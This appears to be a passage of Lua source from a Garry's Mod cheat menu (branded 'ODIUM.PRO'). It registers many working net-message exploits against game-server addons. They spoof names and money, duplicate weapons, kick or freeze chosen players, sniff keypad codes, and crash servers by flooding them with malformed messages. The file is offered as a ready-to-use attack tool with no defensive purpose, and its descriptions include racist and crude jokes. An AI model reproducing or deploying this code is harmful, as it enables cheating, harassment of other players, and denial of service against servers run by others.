            net.WriteString(tostring(LOKI.GetStored( "nc7" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Name:", default = "GET ODIUM.PRO", addr = "nc7" },
        { typ = "func", Name = "Change Name", }
    },
} )
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your name and playermodel to anything",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "UpdateCharSF", "take_my_cash" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "take_my_cash" )
            net.WriteString(-10000)
            net.SendToServer()
            LOKI.NetStart( sploit, "UpdateCharSF")
            net.WriteString(tostring(LOKI.GetStored( "nc8" )))
            net.WriteString(tostring(LOKI.GetStored( "nc8a" )))
            net.WriteString(tostring(LOKI.GetStored( "nc8b" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "First Name:", default = "GET", addr = "nc8" },
        { typ = "string", Name = "Last Name:", default = "ODIUM.PRO", addr = "nc8a" },
        { typ = "string", Name = "Player Model:", default = "models/error.mdl", addr = "nc8b" },
        { typ = "func", Name = "Change Name", }
    },
} ) 
LOKI.AddExploit( "Speed Hack", {
    desc = "Allows you to move at warp speed",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "SprintSpeedset" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "SprintSpeedset")
            net.WriteFloat(LOKI.SafeToNumber(LOKI.GetStored( "sh1" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Speed: ", min = 0, max = math.huge, default = 1000, addr = "sh1" },
        { typ = "func", Name = "Go", }
    },
} ) 
LOKI.AddExploit( "Bonus Exploit", {
    desc = "Free Shit",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "AbilityUse" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "AbilityUse")
            net.WriteInt(tbl[1], 32)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Money", args = {1}, },
        { typ = "func", Name = "Time Bonus", args = {2}, },
        { typ = "func", Name = "HP", args = {3}, },
        { typ = "func", Name = "Armor", args = {4}, },
        { typ = "func", Name = "Salary Bonus", args = {5}, },
        { typ = "func", Name = "Random Weapon", args = {6}, },
        { typ = "func", Name = "Jailbreak", args = {7}, },
    },
} )
LOKI.AddExploit( "Zombie Mode", {
    desc = "Raise an army of unkillable zombies",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "RevivePlayer" ) end,
    OnEnable = function(var, sploit)
        for k, v in ipairs(LOKI.GetStored( "immortal_plyz", {} )) do
            if IsValid(v) then
                if(v:IsPlayer()) then
                    LOKI.NetStart( sploit, "RevivePlayer")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end
    end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local cmd = varargs[1]
            if(cmd:GetMouseX() == 0 && cmd:GetMouseY() == 0 && LOKI.LastAngles) then
                cmd:SetViewAngles(LOKI.LastAngles)
            else
                LOKI.LastAngles = cmd:GetViewAngles()
            end
        end,
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)
            local t = LOKI.GetStored( "immortal_plyz", {} )
            if table.HasValue( t, ent ) then
                if(ent:IsPlayer()) then
                    LOKI.NetStart( sploit, "RevivePlayer")
                    net.WriteEntity(ent)
                    net.SendToServer()
                end
            end
        end,
        player_spawn = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Player(data.userid)
            local t = LOKI.GetStored( "immortal_plyz", {} )
            if table.HasValue( t, ent ) then
                if(ent:IsPlayer()) then
                    LOKI.NetStart( sploit, "RevivePlayer")
                    net.WriteEntity(ent)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "immortal_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Zombie Mode", {
    desc = "Become immortal",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "revival_revive_accept" ) end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)
            if(ent:IsPlayer() && ent == LOKI.GetLP()) then
                LOKI.NetStart( sploit, "revival_revive_accept")
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Zombie Mode", {
    desc = "Infect players with the T-Virus",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "MakeZombie" ) end,
    hooks = {
        Think = function(tbl, sploit, varargs)
            for k, v in pairs(LOKI.GetStored("zomb_plyz", {})) do
                if(!IsValid(v)) then continue end
                LOKI.NetStart(sploit, "MakeZombie")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "zomb_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Zombie Mode", {
    desc = "Recover from any injury",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "UseMedkit" ) end,
    hooks = {
        Think = function(tbl, sploit, varargs)
            for k, v in pairs(LOKI.GetStored("zomb2_plyz", {})) do
                if(!IsValid(v)) then continue end
                LOKI.NetStart(sploit, "UseMedkit")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "zomb2_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Zombie Mode", {
    desc = "Become immortal",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "079ServerAction" ) end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)
            if(ent:IsPlayer() && ent == LOKI.GetLP()) then
                sploit.vars.pos = ent:GetPos()
            end
        end,
        player_spawn = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Player(data.userid)
            if(ent:IsPlayer() && ent == LOKI.GetLP() && sploit.vars.pos != Vector(0,0,0)) then
                LOKI.NetStart(sploit, "079ServerAction")
                net.WriteString("Move")
                net.WriteVector(sploit.vars.pos)
                net.SendToServer()
                sploit.vars.pos = Vector(0,0,0)
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Dupe Weapons", {
    desc = "Hold any gun and press button to dupe",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "ItemStoreSyncItem", "RevivePlayer" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.RCC(sploit, "kill")
            LOKI.RCC(sploit, "darkrp", "invholster")
            LOKI.NetStart(sploit, "RevivePlayer", true)
            net.WriteEntity(LOKI.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Dupe" },
    },
} )
LOKI.AddExploit( "Dupe Weapons", {
    desc = "Disassemble your weapons then nurse them back to health",
    severity = 1,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "ItemStoreSplit" ) || LOKI.ValidNetString( "_ItemStoreSplit" ) || istable(itemstore) end,
    hooks = {
        Think = function(tbl, sploit)
            if(LOKI.ValidNetString( "ItemStoreSplit" ) || LOKI.ValidNetString( "_ItemStoreSplit" )) then
                LOKI.NetStart(sploit, {"ItemStoreSplit", "_ItemStoreSplit"})
                net.WriteUInt(LOKI.GetLP().InventoryID, 32)
                net.WriteUInt(tonumber(LOKI.GetStored( "dupe_index", 1 )), 32)
                net.WriteUInt(0, 32)
                net.SendToServer()
            else
                LOKI.RCC( "itemstore_split", LOKI.GetLP().InventoryID, tonumber(LOKI.GetStored( "dupe_index", 1 )), 0 )
            end
        end,
    },
    functions = {
        { typ = "float", Name = "Index", default = 1, min = 0, max = math.huge, addr = "dupe_index" },
        { typ = "func", Name = "Dupe"},
    },
} )
LOKI.AddExploit( "Freeze Players", {
    desc = "Freeze selected players next time they respawn",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NLR.ActionPlayer" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "freeze_plyz", {} ) ) do
                if IsValid(v) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "NLR.ActionPlayer")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "freeze_plyz" },
        { typ = "bool", },
    },
} )     
LOKI.AddExploit( "Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {enabled = false},
    status = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "plyWarning" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "kick_plyz", {} ) ) do
                if IsValid( v ) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "plyWarning")
                        net.WriteEntity(v)
                        net.WriteString('You have to select a player before doing a action.')
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "kick_plyz" },
        { typ = "func", Name = "Kick" },
    },
} )     
LOKI.AddExploit( "Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NLRKick" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "kick2_plyz", {} ) ) do
                if IsValid( v ) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "NLRKick")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "kick2_plyz" },
        { typ = "func", Name = "Kick" },
    },
} ) 
LOKI.AddExploit( "Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "RecKickAFKer" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "kick3_plyz", {} ) ) do
                if IsValid(v) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "RecKickAFKer")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "kick3_plyz" },
        { typ = "func", Name = "Kick" },
    },
} )
LOKI.AddExploit( "Kick Exploit", {
    desc = "Kick all players",
    severity = 1,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return (LOKI.ValidNetString( "simfphys_turnsignal" )) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "simfphys_turnsignal")
            net.WriteEntity(LOKI.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "send" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "kick4_plyz", {} ) ) do
                if IsValid(v) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "send")
                        net.WriteTable({1})
                        net.WriteTable({1})
                        net.WriteEntity(v)
                        net.WriteString("GET ODIUM.PRO")
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "kick4_plyz" },
        { typ = "func", Name = "Kick" },
    },
} )
LOKI.AddExploit( "Kick Exploit", {
    desc = "Kick selected players",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return LOKI.ValidNetString( "sendteslaeffect" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "kick5_plyz", {} ) ) do
                if IsValid(v) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "sendteslaeffect")
                        net.WriteEntity(v)
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "kick5_plyz" },
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Respawn Exploit", {
    desc = "Respawn yourself",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.DynamicNetString("DarkRP_", "_ForceSpawn") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, sploit.channel )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Respawn", args = {}, },
    },
} ) 
LOKI.AddExploit( "Respawn Exploit", {
    desc = "Respawn yourself",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NLR_SPAWN" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "NLR_SPAWN")
            net.WriteEntity(LOKI.GetLP())
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Respawn", args = {}, },
    },
} )
LOKI.AddExploit( "Steal Police Guns", {
    desc = "WE WUZ KANGZ ND SHIET!",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local r_tbl = LOKI.RecursiveGetVar(sploit, {"vars", "Think"}, "table", true)
            if(r_tbl.cooldown == 0) then
                r_tbl.cooldown = (LOKI.REAL_CURTIME + 300)
            end
            LOKI.NetStart( sploit, "ARMORY_RetrieveWeapon")
            net.WriteString("weapon" .. tbl[1])
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Get " .. (ARMORY_WEAPON_Weapon1Name || "M16"), args = {1}, },
        { typ = "func", Name = "Get " .. (ARMORY_WEAPON_Weapon2Name || "Shotgun"), args = {2}, },
        { typ = "func", Name = "Get " .. (ARMORY_WEAPON_Weapon3Name || "Sniper"), args = {3}, },
    },
} ) 
LOKI.AddExploit( "Build/Kill", {
    desc = "Back in my day, we didn't need 'safe spaces'",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "BuilderXToggleKill" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "buildkill_plyz", {} ) ) do
                if !IsValid(v) then continue end
                if(tbl[1] == 1) then
                    LOKI.NetStart( sploit, "BuilderXToggleBuild")
                    net.WriteEntity(v)
                    net.SendToServer()
                elseif(tbl[1] == 2) then
                    LOKI.NetStart( sploit, "BuilderXToggleKill")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "buildkill_plyz" },
        { typ = "func", Name = "Toggle Build", args = {1}, },
        { typ = "func", Name = "Toggle Kill", args = {2}, }
    },
} ) 
LOKI.AddExploit( "Keypad Hacker", {
    desc = "Roleplay as a Hacker by exploding all nearby keypads",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "start_wd_emp" ) && wd_Config != nil end,
    hooks = {
        Think = function(tbl, sploit)
            local r_tbl = LOKI.RecursiveGetVar(sploit, {"vars", "Think"}, "table", true)
            if(r_tbl.cooldown == 0) then
                r_tbl.cooldown = (LOKI.REAL_CURTIME + (wd_Config.EmpCooldown || 100))
            end
            LOKI.NetStart( sploit, "start_wd_emp")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Hack", },
    },
} )
LOKI.AddExploit( "Ja, Mein Führer", {
    desc = "Submit candidacy for the Führer election",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "1942_Fuhrer_SubmitCandidacy" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "1942_Fuhrer_SubmitCandidacy")
            net.WriteString(LOKI.GetLP():Nick())
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Submit", },
    },
} )
LOKI.AddExploit( "Keypad Hacker", {
    desc = "Inspector gadget these fools",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.DynamicNetString( "keypad" ) end,
    hooks = {
        PostRender = function(tbl, sploit)
            local e = LOKI.GetLP():GetEyeTrace().Entity
            if IsValid(e) and e.GetStatus then
                local text;
                local color;
                if(LOKI.KeypadCodes[e] && LOKI.KeypadCodes[e] != "") then
                    text = LOKI.KeypadCodes[e];
                    color = Color( 105, 255, 105, 150 )
                elseif(LOKI.TempKeypadCodes[e] && LOKI.TempKeypadCodes[e] != "") then
                    text = LOKI.TempKeypadCodes[e];
                    color = Color( 250, 150, 150, 150 )
                else
                    text = "Unknown"
                    color = Color(150,150,150,150)
                end
                surface.SetDrawColor( Color( 0,0,50, 150 ) )
                surface.SetMaterial( grad )
                surface.DrawTexturedRect( ScrW() / 2 + 57, ScrH() / 2 - 7, 50, 15 )
                LOKI.DrawText(text, "DermaDefault", ScrW() / 2 + 60, ScrH() / 2, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
            end
            for k,v in ipairs(LOKI.ents.FindByGlobal("GetStatus")) do
                if(v.GetNumStars && !v.GetText) then
                    v.GetText = function() return string.rep('*', v:GetNumStars()) end
                end
                if(!v.GetSecure) then
                    v.GetSecure = function() return true end
                end
                if IsValid(v) then
                    if v != e and LOKI.GetLP():GetPos():Distance( v:GetPos() ) < 8000 then
                        local pos = v:GetPos():ToScreen()
                        if pos.x > 0 and pos.x < ScrW() and pos.y > 0 and pos.y < ScrH() then
                            if (LOKI.KeypadCodes[v] && LOKI.KeypadCodes[v] != "") then
                                surface.SetDrawColor( Color( 0,0,50, 150 ) )
                                surface.SetMaterial( grad )
                                surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )
                                LOKI.DrawText( LOKI.KeypadCodes[v], "DermaDefault", pos.x + 5, pos.y + 6, Color( 105, 255, 105, 150 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                            else
                                if(LOKI.TempKeypadCodes[v] && LOKI.TempKeypadCodes[v] != "") then
                                    surface.SetDrawColor( Color( 0,0,50, 150 ) )
                                    surface.SetMaterial( grad )
                                    surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )
                                    LOKI.DrawText( LOKI.TempKeypadCodes[v], "DermaDefault", pos.x + 5, pos.y + 6, Color( 250, 150, 150, 150 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                                else
                                    surface.SetDrawColor( Color( 0,0,50, 150 ) )
                                    surface.SetMaterial( grad )
                                    surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )
                                    LOKI.DrawText( "Unknown", "DermaDefault", pos.x + 5, pos.y + 6, Color(150,150,150,150), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                                end
                            end
                        end
                    end
                end
            end
        end,
        Tick = function(tbl, sploit)
            for k, v in ipairs( player.GetAll() ) do
                local kp = v:GetEyeTrace().Entity
                if IsValid(kp) && IsValid(v) and kp.GetStatus and v:EyePos():Distance(kp:GetPos()) <= 120 then
                    LOKI.TempKeypadCodes[kp] = LOKI.TempKeypadCodes[kp] or ""
                    LOKI.KeypadText[kp] = LOKI.KeypadText[kp] or ""
                    LOKI.KeypadStatus[kp] = LOKI.KeypadStatus[kp] or 0
                        
                    if isfunction(kp.GetText) && isfunction(kp.GetStatus) && (kp:GetText() != LOKI.KeypadText[kp] or kp:GetStatus() != LOKI.KeypadStatus[kp]) then
                        LOKI.KeypadText[kp] = kp:GetText()
                        LOKI.KeypadStatus[kp] = kp:GetStatus()
                        if(LOKI.KeypadText[kp] && !kp:GetSecure()) then
                            LOKI.TempKeypadCodes[kp] = LOKI.KeypadText[kp]
                            if LOKI.KeypadStatus[kp] == LOKI.GetKeypadStatus(kp)[2] && LOKI.TempKeypadCodes[kp] && LOKI.TempKeypadCodes[kp] != "" then
                                LOKI.KeypadCodes[kp] = LOKI.TempKeypadCodes[kp]
                                if(!system.HasFocus()) then system.FlashWindow() end
                            end
                        else
                            local i = LOKI.KPGetHoveredElement(v, kp)
                            if (i) then i = i.text end
                            if LOKI.KeypadText[kp] then
                                if kp:GetStatus() == LOKI.GetKeypadStatus(kp)[2] && LOKI.TempKeypadCodes[kp] && LOKI.TempKeypadCodes[kp] != "" then
                                    LOKI.KeypadCodes[kp] = LOKI.TempKeypadCodes[kp]
                                    if(!system.HasFocus()) then system.FlashWindow() end
                                end
                            end
                            
                            if LOKI.KeypadText[kp] == "" || kp:GetStatus() == LOKI.GetKeypadStatus(kp)[3] then
                                LOKI.TempKeypadCodes[kp] = ""
                            end
                                
                            if(LOKI.SafeToNumber(i) && (LOKI.SafeToNumber(i) > 0 && LOKI.SafeToNumber(i) < 10) && kp:GetText():len() != 0) then
                                LOKI.TempKeypadCodes[kp] = LOKI.TempKeypadCodes[kp]..LOKI.SafeToNumber(i)
                            end
                        end
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Guaranteed server crash",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    prevalidated = true,
    scan = function() return (LOKI.ValidNetString( "textstickers_entdata" ) || LOKI.ValidNetString( "texstickers_entdata" )) && TexStickers end,
    hooks = {
        Think = function(tbl, sploit)
            if(LOKI.ValidNetString( "textstickers_entdata" )) then
                LOKI.NetStart( sploit, "textstickers_entdata" )
            else
                LOKI.NetStart( sploit, "texstickers_entdata" )
            end
            net.WriteUInt( 0xFFFFFFFF, 32 )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Dunks the server in one",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "fly_over_end" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "fly_over_end" )
            net.WriteString(tostring(math.pow(2, 64)).." "..tostring(math.pow(2, 64)).." "..tostring(math.pow(2, 64)))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Crash Jackson", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Instantly 1 tap the server",
    severity = 100,
    bools = {enabled = false},
    status = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "SimplicityAC_aysent" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "SimplicityAC_aysent")
            net.WriteUInt(1, 8)
            net.WriteUInt(0xFFFFFFFF, 32)
            net.WriteTable({})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Crash it", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Whoops, did I accidentally leave this in here?",
    severity = 100,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "rHit.Confirm.Placement" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, 'rHit.Confirm.Placement' )
            net.WriteInt( 0xFFFFFFFF, 32 )
            net.WriteEntity( LOKI.GetLP() )
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "rHit.Send.Message") then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Server Crasher", {
    desc = "Brutal server rape",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "thiefnpc" ) || LOKI.ValidNetString( "cst_badnpc" ) end,
    hooks = {
        Think = function(tbl, sploit)
            if(LOKI.ValidNetString( "thiefnpc" )) then
                LOKI.NetStart( sploit, "thiefnpc")
            elseif(LOKI.ValidNetString( "cst_badnpc" )) then
                LOKI.NetStart( sploit, "cst_badnpc")
            else
                return
            end
            net.WriteDouble(LOKI.GetLP():EntIndex())
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "memset(SERVER, nullptr, size(SERVER) + 1)",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "nSetExpression" ) end,
    hooks = {
        Think = function(tbl, sploit)
            if(!sploit.var || sploit.var == 3) then
                sploit.var = 1
            else
                sploit.var = sploit.var + 1
            end
            LOKI.NetStart( sploit, "nSetExpression")
            net.WriteFloat(sploit.var)
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "*flex*",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    msgs_per_tick = 2,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "TowTruck_CreateTowTruck", "TOWTRUCK_RemoveTowTruck" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "TowTruck_CreateTowTruck")
            net.SendToServer()
             LOKI.NetStart( sploit, "TOWTRUCK_RemoveTowTruck")
            net.SendToServer() 
        end,
        usermessage = {
            IncomingMessage = function(sploit, varargs)
                if(varargs[1] == "_Notify") then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = tostring(LOKI.GetLP()) .. " hit SERVER in head for 100 damage",
    severity = 100,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "StaminaDrowning" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "StaminaDrowning")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "game.GetWorld():Activate()",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return LOKI.ValidNetString( "CRAFTINGMOD_INVENTORY" ) end,
    initial = function(sploit)
        local vars = sploit.vars || LOKI.RecursiveGetVar(sploit, {"vars"}, "table", true)
        if(!vars.NAME) then
            local ItemsList = LOKI.RecursiveGetVar(CRAFTINGMOD, {"ITEMS", "GetItemsList"}, "function")
            if(ItemsList) then
                for k, v in pairs(ItemsList(CRAFTINGMOD.ITEMS)) do
                    if(!v.LoadData) then
                        vars.NAME = v.NAME
                        break
                    end
                end
            end
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            local vars = sploit.vars || LOKI.RecursiveGetVar(sploit, {"vars"}, "table", true)
            LOKI.NetStart(sploit, "CRAFTINGMOD_INVENTORY")
            net.WriteTable({type = 6, ENTITY = "worldspawn", SKIN = 0, MODEL = "models/error.mdl", NAME = vars.NAME || "Beer"})
            net.WriteInt(0, 16)
            net.WriteString(tostring(LOKI.RecursiveGetVar(CRAFTINGMOD, {"PANELS", "Inventory_ID"}, "string") || 0))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", Name = "Give me shit", },
    },
} )
--WUMAAccessStream has a ReadData related lag exploit
LOKI.AddExploit( "Server Crasher", {
    desc = "Crashes any server",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "npctool_relman_up" ) end,
    hooks = {
        Think = function(tbl, sploit)       
            LOKI.NetStart(sploit, "npctool_relman_up")
            net.WriteUInt(-1, 12)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Overflow the server bathtub",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "CreateBadgeSpray" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "CreateBadgeSpray")
            net.SendToServer() 
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Shred the server",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "CallP" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "CallP" )
            net.WriteEntity(LOKI.GetLP())
            net.WriteBit(true)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Burst the servers ear drums",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return usermessage.GetTable()["sounds_yo"] != nil || LOKI.ValidNetString("sounds_yo") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.RCC(sploit, "sounds_request")
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "sounds_yo") then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
    },
} )
